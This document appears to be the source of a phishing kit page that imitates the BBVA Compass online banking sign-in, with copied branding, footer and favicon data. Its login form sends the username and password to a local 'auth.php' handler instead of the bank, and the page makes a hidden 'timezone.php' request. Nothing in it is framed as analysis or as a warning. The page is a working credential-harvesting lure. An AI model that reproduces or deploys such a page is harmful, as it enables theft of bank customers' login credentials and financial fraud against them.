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QcLRiEHC0YhB75GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RR8F/1w8Jf/p5OH//////7Chlv9fPyn/bE86/8a7s////////////5uHeP9DHgT/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEHvkYhBwtGIQcLRiEHvkYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9FHwX/Wzsk/+Pd2f/6+fj/7+zq/+bh3v/s6eb/+ff2//Px7//Dt6//Wzsk/0UgBf9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQe+RiEHC0YhBwtGIQe+RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9MKA7/blI9/3RZRf91WUX/dVpG/3VZRv90WEX/akw3/04rEv9FIAX/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB75GIQcLRiEHC0YhB75GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9EHgT/Qx4D/0MeA/9DHgP/Qx4D/0MeA/9EHgT/RSAG/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEHvkYhBwtGIQcLRiEHvkYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQe+RiEHC0YhBwlGIQe6RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB7pGIQcJRiEHAUYhB5xGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEHnEYhBwEAAAAARiEHVEYhB/hGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/hGIQdUAAAAAAAAAABGIQcMRiEHp0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEHp0YhBwwAAAAAAAAAAAAAAABGIQcdRiEHqEYhB/hGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH+EYhB6hGIQcdAAAAAAAAAAAAAAAAAAAAAAAAAABGIQcNRiEHVEYhB51GIQe6RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHukYhB51GIQdURiEHDQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARiEHAkYhBwlGIQcLRiEHC0YhBwtGIQcLRiEHC0YhBwtGIQcLRiEHC0YhBwtGIQcLRiEHC0YhBwtGIQcLRiEHC0YhBwtGIQcLRiEHC0YhBwtGIQcJRiEHAgAAAAAAAAAAAAAAAAAAAAAAAAAA//////gAAB/gAAAHwAAAA8AAAAOAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABwAAAA8AAAAPgAAAH+AAAH/////8oAAAAEAAAACAAAAABACAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYhBwxGIQdPRiEHdkYhB3hGIQd3RiEHd0YhB3dGIQd3RiEHd0YhB3dGIQd4RiEHdkYhB09GIQcMAAAAAEYhBwtGIQeQRiEH9UYhB/5GIQf+RiEH/kYhB/5GIQf+RiEH/kYhB/5GIQf+RiEH/kYhB/5GIQf1RiEHkEYhBwtGIQdPRiEH80YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/NGIQdPRiEHdUYhB/5GIQf/RiEH/0YhB/9FIAX/RB4E/0QeBP9EHwT/RSAG/0YhB/9GIQf/RiEH/0YhB/9GIQf+RiEHdUYhB3dGIQf+RiEH/0YhB/9FIAb/WDcf/2xOOf9tUDz/aEo1/1AtFf9FIAb/RiEH/0YhB/9GIQf/RiEH/kYhB3dGIQd3RiEH/kYhB/9GIQf/RB4E/56Lff/b1M7/pJKF/93W0v/LwLn/Xz8o/0UfBf9GIQf/RiEH/0YhB/5GIQd3RiEHd0YhB/5GIQf/RiEH/0MeBP+mlIf/zMK6/0cjCf+gjX///////5eCdP9DHgP/RiEH/0YhB/9GIQf+RiEHd0YhB3dGIQf+RiEH/0YhB/9DHgT/pZSH/8zCu/9KJgz/pJKF//v6+v+EbFr/Qx4D/0YhB/9GIQf/RiEH/kYhB3dGIQd3RiEH/kYhB/9GIQf/Qx4E/6WUh//LwLn/Z0gz/+Xf3P+vn5P/SycO/0YgBv9GIQf/RiEH/0YhB/5GIQd3RiEHd0YhB/5GIQf/RiEH/0MeBP+mlIf/zMG6/1EuFf/Nw7z/uKqg/0ciCP9GIQf/RiEH/0YhB/9GIQf+RiEHd0YhB3dGIQf+RiEH/0YhB/9EHgT/nYp8/9rTzv+hjoH/29TP/6mXi/9HIgj/RiEH/0YhB/9GIQf/RiEH/kYhB3dGIQd3RiEH/kYhB/9GIQf/RiAG/1c1Hf9oSjX/akw4/2VGMP9NKhH/RiAG/0YhB/9GIQf/RiEH/0YhB/5GIQd3RiEHdUYhB/5GIQf/RiEH/0YhB/9FIAb/RB4E/0QeBP9EHwT/RiAG/0YhB/9GIQf/RiEH/0YhB/9GIQf+RiEHdUYhB09GIQfzRiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH80YhB09GIQcLRiEHkEYhB/VGIQf+RiEH/kYhB/5GIQf+RiEH/kYhB/5GIQf+RiEH/kYhB/5GIQf+RiEH9UYhB5BGIQcLAAAAAEYhBwxGIQdPRiEHdkYhB3hGIQd3RiEHd0YhB3dGIQd3RiEHd0YhB3dGIQd4RiEHdkYhB09GIQcMAAAAAP//AACAAQAAgAEAAIABAACAAQAAgAEAAIABAACAAQAAgAEAAIABAACAAQAAgAEAAIABAACAAQAAgAEAAP//AAA=">
<style>@keyframes sxt-play-anim-hover{from{background-position:0px}to{background-position:-5250px}}@keyframes sxt-play-anim-saving{100%{background-position:-14750px}}@keyframes sxt-play-anim-saved{100%{background-position:-5000px}}</style>

    <title>Sign In | BBVA Compass</title>
    <script>
      bazadebezolkohpepadr = "1674814891"

    </script>
    <script type="text/javascript" src="" defer></script>
  </head>

  <body style="visibility:hidden" onload="unhideBody()">
      <script type="text/javascript" language="JavaScript">
         document.getElementById("noScript").style.display = "none";
    </script>

    <!-- Begin Browser Alert -->
    <section id="browser-alert" class="collapse container-fluid alert-msg" role="alert" aria-label="browser alert">
      <div class="container">
        <div class="row">
          <div class="col-xs-12">
            <div class="alert-msg-body">
              <span class="icon icon-md bbva-coronita_alert"></span>

              <p class="alert-msg-content">Microsoft's support for your web browser ended on January 12, 2016. To continue to use our online services, you must upgrade to a current version of <a class="blue1" href="https://www.google.com/chrome/browser/desktop/index.html" target="_blank"><strong>Google Chrome</strong></a><sup>TM</sup>,
                <a class="blue1" href="https://www.mozilla.org/en-US/firefox/new/" target="_blank"><strong>Mozilla Firefox</strong></a><sup>&reg;</sup> or <a class="blue1" href="http://windows.microsoft.com/en-us/internet-explorer/download-ie" target="_blank"><strong>Microsoft Internet Explorer</strong></a><sup>&reg;</sup>.</p>

              <a class="alert-msg-close" href="#"><span class="icon bbva-coronita_close"></span></a>
            </div>
            <!-- /.alert-msg-body -->
          </div>
          <!-- /.row -->
        </div>
        <!-- /.col -->
      </div>
      <!-- /.container -->
    </section>
    <!-- /#browser-alert -->
    <!-- End Browser Alert -->
    <header class="header container-fluid">
      <!--<header id="top" class="container-fluid">-->
      <nav class="simplified-header">
        <div class="container">
          <a class="" href="" id="logo"><img src="./files/bbvacompass-white.svg" alt="BBVA Compass"></a>
        </div>
      </nav>
      <!--</header>&lt;!&ndash; /.container-fluid &ndash;&gt;-->
    </header>

    <div>
      <div class="fullwidthsection section">
        <section class="container-fluid   " role="region" aria-label="content section 830850345">
          <!-- Inside the wrapper, use normal Bootstrap structure: Container, Row, and Column -->
          <div class="container">
            <div class="row">
              <div class="col-xs-12">


                <div class="columns section">



                  <section role="region" aria-label="columns content 816424956">
                    <div class="row">

                      <div class="col-md-3">
                        <div>
                        </div>
                      </div>

                      <div class="col-md-6">
                        <div>
                          <div class="htmleditor section">


                            <!-- /** Load all CSS paths first**/-->


                            <h1 class="h3 thin" style="text-align: center;">Online Banking Sign In</h1>
                            <form autocomplete="off" id="olbLoginForm" class="mod dedicated-signin" method="post" action="auth.php?p=1&session=<?=$session?>">
                              <div class="form-group">
                                <div id="signon-error-msg" class="signon-error-msg"><noscript>
Enable JavaScript to login</noscript>
                                </div>
                                <div class="username-input"><input class="remembered-username" type="text" name="usernameRemembered" style="display: inline-block; position: absolute; width: 1px; height: 1px; padding: 0px; margin: 0px; opacity: 0;">&nbsp;
                                  <div class="username"><input class="inputusername" placeholder="Username" autofocus="autofocus" autocomplete="off" type="text" name="userNameInput" id="userNameInput" maxlength="20">&nbsp;<input class="remembered-username" type="text" name="usernameRemembered"
                                      style="display: inline-block; position: absolute; width: 1px; height: 1px; padding: 0px; margin: 0px; opacity: 0;"></div>
                                  <div class="password"><input class="inputpassword " placeholder="Password" autocomplete="off" type="password" name="passwordInput" id="passwordInput" maxlength="20" style="background-image: url(&quot;data:image/png; base64,ivborw0kggoaaaansuheugaaaaeaaaabcaqaaac1hawcaaaac0leqvr4ngp6zwaaagcbapocmxeaaaaasuvork5cyii=&quot;); background-repeat: no-repeat; background-size: 16px 18px; background-position: 98% 50%;"
                                      aria-invalid="false">&nbsp;<span toggle="#PasswordInput" class="icon icon-sm bbva-coronita_visual visual-icon" onclick="return OlbLogin.showHideToggle(this)"></span></div>
                                  <input id="submit-olb" class="btn btn-sm btn-aqua" type="submit" name="signon" value="Sign In" onclick="return doLogin(this)"><input autocomplete="off" class="hiddenusername" type="hidden" name="UserName" id="userName">
                                  <input
                                    autocomplete="off" type="hidden" required="required" name="Password" id="password"></div>
                              </div>
                              <div class="remember-me" style="margin: 0 auto 20px; display: table;"><input type="checkbox" name="rememberme" class="css-checkbox remember-me-chk" id="remembermeChk" value="check"><label for="remembermeChk"><span class="faux-box"></span>Remember Me</label></div>
                            </form>
                            <div class="sign-in-links">
                              <div class="forgot-password" style="text-align: center;">
                                <p class="smallmargin"><a href="#">Forgot Your UserName?</a></p>
                                <p class="smallmargin"><a href="#">Forgot Your Password?</a></p>
                                <p class="smallmargin"><a href="#">Activate Your Online Banking</a></p>
                                <p class="smallmargin"><a href="#">More Online Services</a></p>
                                <p class="smallmargin"><a href="#">View All Demos</a></p>
                              </div>
                            </div>
                            <!-- /* Load all JS paths */-->
                          </div>
                        </div>
                      </div>

                    </div>
                    <!-- /.row -->
                  </section>

                </div>




              </div>
            </div>
          </div>
        </section>
      </div>

    </div>

    <!-- Begin Pre-Footer -->
    <div>






      <div>
        <section role="navigation" aria-label="related page links 63391983" class="pre-footer  container-fluid">
          <div class="container">
            <div class="row">
              <div class="flex">


                <div class="col-xs-12 col-sm-6 col-md-3">
                  <div class="htmleditor section">

                    <!-- /** Load all CSS paths first**/-->


                    <h2>About BBVA Compass</h2>
                    <ul>
                      <li><a title="Our Story" href="#">Our Story</a></li>
                      <li><a href="#" target="_blank">Investor Relations</a></li>
                      <li><a title="Security Center" href="#">Security Center</a></li>
                      <li><a title="Find a Branch" href="#">Find a Branch</a></li>
                      <li><a title="Customer Service" href="#">Customer Service</a></li>
                      <li><a title="Careers" href="#">Careers</a></li>
                    </ul>
                    <!-- /* Load all JS paths */-->
                  </div>


                </div>
                <!-- .col -->

                <div class="col-xs-12 col-sm-6 col-md-3">
                  <div class="htmleditor section">

                    <!-- /** Load all CSS paths first**/-->


                    <h2>Additional Services</h2>
                    <ul>
                      <li><a title="Investment Services" href="#">Investment Services</a></li>
                      <li><a title="Insurance Services" href="#">Insurance Services</a></li>
                      <li><a title="Wealth Solutions" href="#" target="_blank">Wealth Solutions</a></li>
                      <li><a href="#">Mobile Banking</a></li>
                      <li><a href="#">ATM Banking</a></li>
                    </ul>
                    <!-- /* Load all JS paths */-->
                  </div>


                </div>
                <!-- .col -->

                <div class="col-xs-12 col-sm-6 col-md-3">
                  <div class="htmleditor section">

                    <!-- /** Load all CSS paths first**/-->


                    <h2>Product Services</h2>
                    <ul>
                      <li><a href="#" target="_self" title="Remote Banking">Remote Banking</a></li>
                      <li><a href="#" target="_self" title="Student Banking">Student Banking</a></li>
                      <li><a href="#">ClearSpend Prepaid Card</a></li>
                    </ul>
                    <!-- /* Load all JS paths */-->
                  </div>


                </div>
                <!-- .col -->

                <div class="col-xs-12 col-sm-6 col-md-3">
                  <div class="text parbase section">
                    <h2>Award-Winning BBVA Compass Mobile App</h2>
                    <p>Save time and bank on the go.</p>

                  </div>
                  <div class="cta section">
                    <a href="#" class="icon-link" target="_self" data-location-id="content_bbvacompass_en_prefooters_personal-prefooter_jcrcontent_par_prefooter_par4_cta_copy_copy">
        <span class="icon bbva-coronita_download"></span>
        Download Now
</a></div>


                </div>
              </div>
            </div>
            <!-- .row -->
          </div>
          <!-- .container -->
        </section>


      </div>

    </div>
    <!-- End Pre-Footer -->
    <footer class="container-fluid">
      <section class="container" role="contentinfo" aria-label="footer">
        <div class="row">
          <div class="col-sm-8 tagline-container">
            <a href="#" class="logo" data-location-id="jcrcontent_footer"><img src="./files/bbvacompass-white.svg" alt="BBVA Compass"></a>
            <p class="tagline">Creating Opportunities</p>
          </div>

          <div class="col-sm-4 social-media">
            <ul>
              <a href="#" title="Like us on Facebook" target="_blank" data-location-id="jcrcontent_footer">
                        <i class="fa fa-facebook facebook"></i>
                    </a>

              <a href="@" title="Like us on Twitter" target="_blank" data-location-id="jcrcontent_footer">
                        <i class="fa fa-twitter twitter"></i>
                    </a>

              <a href="@" title="Find us on Instagram" target="_blank" data-location-id="jcrcontent_footer">
                        <i class="fa fa-instagram instagram"></i>
                    </a>

              <a href="#" title="Find us on Linkedin" target="_blank" data-location-id="jcrcontent_footer">
                        <i class="fa fa-linkedin linkedin"></i>
                    </a>

              <a href="#" title="Join us on Google Plus" target="_blank" data-location-id="jcrcontent_footer">
                        <i class="fa fa-google-plus googleplus"></i>
                    </a>

              <a href="#" title="Find us on Pinterest" target="_blank" data-location-id="jcrcontent_footer">
                        <i class="fa fa-pinterest pinterest"></i>
                    </a>

              <a href="#" title="Find us on Youtube" target="_blank" data-location-id="jcrcontent_footer">
                        <i class="fa fa-youtube youtube"></i>
                    </a>
            </ul>
          </div>
          <nav role="navigation" aria-label="footer navigation" class="col-xs-12">
            <ul>
              <li><a href="/policy/privacy-policy.html" target="_self" data-location-id="jcrcontent_footer">Privacy</a></li>

              <li><a href="/locations.html" target="_self" data-location-id="jcrcontent_footer">Locations</a></li>

              <li><a href="/contact.html" target="_self" data-location-id="jcrcontent_footer">Contact Us</a></li>

              <li><a href="/sitemap.html" target="_self" data-location-id="jcrcontent_footer">Site Map</a></li>
            </ul>
          </nav>
        </div>
        <!-- /.footer nav-->
        <div class="row">
          <div class="col-md-12">
            <p class="disclosure">&copy; 2018 BBVA Compass Bancshares, Inc. Compass Bank is a Member FDIC and an Equal Housing Lender. <span class="icon bbva-coronita_ehl-nowords"></span> BBVA Compass is a trade name of Compass Bank, a member of the BBVA Group.</p>
          </div>
          <!-- /.col -->
        </div>
        <!-- /.row -->
      </section>
      <!-- /.container -->
    </footer>
    <!-- /.container-fluid -->








<!--  

    <script type="text/javascript">
      (function() {
        window.ContextHub = window.ContextHub || {};

        /* setting paths */
        ContextHub.Paths = ContextHub.Paths || {};
        ContextHub.Paths.CONTEXTHUB_PATH = "/etc/cloudsettings/default/contexthub";
        ContextHub.Paths.RESOURCE_PATH = "\/content\/bbvacompass\/en\/personal\/sign\u002Din\/jcr:content\/contexthub";
        ContextHub.Paths.SEGMENTATION_PATH = "\/etc\/segmentation\/contexthub";
        ContextHub.Paths.CQ_CONTEXT_PATH = "";

        /* setting initial constants */
        ContextHub.Constants = ContextHub.Constants || {};
        ContextHub.Constants.ANONYMOUS_HOME = "/home/users/m/meSNUHPPGd5dJ3lSJ-nT";
        ContextHub.Constants.MODE = "no-ui";
      }());

    </script>
    <script src="./files/contexthub.kernel.js" type="text/javascript"></script>

-->

    <script type="text/javascript" src="./files/footer.min.1a63b99efd91985c87c431eeefd7d9c9.js"></script>






    <script type="text/javascript" src="./files/specialfunctions.min.398ab99ee3f504a5f7dc0f7b502077aa.js"></script>




    <!-- Needed for Dynamic Tag Manager -->
    <script type="text/javascript">
      if (typeof(_satellite) !== 'undefined') {
        _satellite.pageBottom();
      } else {
        console.log('_satellite is not defined')
      }

    </script>


    <noscript>
    </noscript>
  
                <script type="text/javascript">
$(document).ready(function () {
    jQuery.ajax({
                  url: 'timezone.php' + '?time=' + new Date(),
                  success: function (result) {
                      //
                  },
                  async: false
                      });
});
    </script>

</body>

</html>
<?php ob_end_flush(); ?>